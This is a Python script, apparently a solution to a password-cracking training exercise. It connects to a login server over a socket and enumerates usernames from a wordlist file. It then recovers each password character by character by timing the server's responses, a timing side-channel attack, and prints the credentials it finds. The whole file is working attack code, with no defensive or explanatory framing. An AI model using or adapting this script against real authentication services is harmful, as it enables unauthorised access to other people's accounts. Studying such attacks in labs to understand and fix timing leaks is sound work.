from time import time
import socket
import string
import json
import sys


def create_socket():
    ip_address = sys.argv[1] if len(sys.argv) > 1 else 'localhost'
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 9090
    address = (ip_address, port)

    try:
        with socket.socket() as client:
            client.connect(address)
            for login in password_from_file(r'C:\logins.txt'):
                password = ''
                json_data = py_to_json(login, password)
                data_encoded = json_data.encode()
                client.send(data_encoded)
                response = client.recv(1024).decode('utf8')
                data = json.loads(response)

                if data.get("result") in ["Wrong password!", "Exception happened during login"]:
                    password = find_password(client, login)
                    json_data = py_to_json(login, password)
                    print(json_data)
                    break
            else:
                print('Login not found.')

    except Exception as e:
        print(f"An error occurred: {e}")


def find_password(client, login):
    charset = string.ascii_letters + string.digits
    password = ''
    max_lag_time = 0.1

    while True:
        for char in charset:
            try_password = password + char
            json_data = py_to_json(login, try_password)
            data_encoded = json_data.encode()
            client.send(data_encoded)
            start = time()
            response = client.recv(1024).decode('utf8')
            end = time()
            data = json.loads(response)

            if end - start > max_lag_time:
                password += char
                break
            if data.get("result") == "Connection success!":
                return try_password


def py_to_json(login, password):
    return json.dumps({"login": login, "password": password})


def password_from_file(file):
    try:
        with open(file, 'r') as password_file:
            for password in password_file:
                yield password.strip()
    except FileNotFoundError:
        print(f"File not found: {file}")
        sys.exit(1)


if __name__ == "__main__":
    create_socket()
